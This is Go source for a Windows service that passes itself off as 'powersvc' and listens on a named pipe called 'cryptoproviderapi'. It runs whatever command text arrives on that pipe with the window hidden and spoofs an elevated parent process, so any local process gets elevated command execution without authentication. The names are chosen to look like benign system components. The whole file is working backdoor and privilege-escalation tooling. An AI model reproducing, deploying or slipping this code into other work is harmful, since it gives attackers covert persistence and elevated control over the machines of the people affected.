// +build windows

package main

import (
	"bytes"
	"fmt"
	"io"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/npipe"

	"golang.org/x/sys/windows/svc"
)

var bufs = sync.Pool{
	New: func() interface{} {
		return new(bytes.Buffer)
	},
}

const (
	pipeName = "cryptoproviderapi"
	svcName  = "powersvc"
)

type elevate struct{}

func main() {
	svc.Run(svcName, elevate{})
}
func send(s string) {
	u, err := npipe.Dial(fmt.Sprintf(`\\.\pipe\%s`, pipeName))
	if err != nil {
		panic(err)
	}
	if _, err := u.Write([]byte(s)); err != nil {
		panic(err)
	}
	u.Close()
}
func listen(l net.Listener) {
	for {
		c, err := l.Accept()
		if err != nil {
			e, ok := err.(net.Error)
			if ok && e.Timeout() {
				continue
			}
			if ok && !e.Timeout() && !e.Temporary() {
				break
			}
			continue
		}
		b := bufs.Get().(*bytes.Buffer)
		io.Copy(b, c)
		c.Close()
		e := cmd.Process{Args: cmd.Split(strings.ReplaceAll(string(b.Bytes()), "\n", ""))}
		e.SetNoWindow(true)
		e.SetWindowDisplay(0)
		b.Reset()
		bufs.Put(b)
		e.SetParentElevatedRandom(nil)
		e.Start()
	}
}
func (elevate) Execute(_ []string, r <-chan svc.ChangeRequest, i chan<- svc.Status) (bool, uint32) {
	i <- svc.Status{State: svc.StartPending}
	l, err := npipe.Listen(fmt.Sprintf(`\\.\pipe\%s`, pipeName))
	if err != nil {
		i <- svc.Status{State: svc.StopPending}
		return false, 0
	}
	go listen(l)
	i <- svc.Status{State: svc.Running, Accepts: svc.AcceptStop | svc.AcceptShutdown}
	for {
		select {
		case q := <-r:
			switch q.Cmd {
			case svc.Interrogate:
				i <- q.CurrentStatus
				time.Sleep(100 * time.Millisecond)
				i <- q.CurrentStatus
			case svc.Stop, svc.Shutdown:
				l.Close()
				i <- svc.Status{State: svc.StopPending}
				return false, 0
			default:
			}
		}
	}
	l.Close()
	i <- svc.Status{State: svc.StopPending}
	return false, 0
}
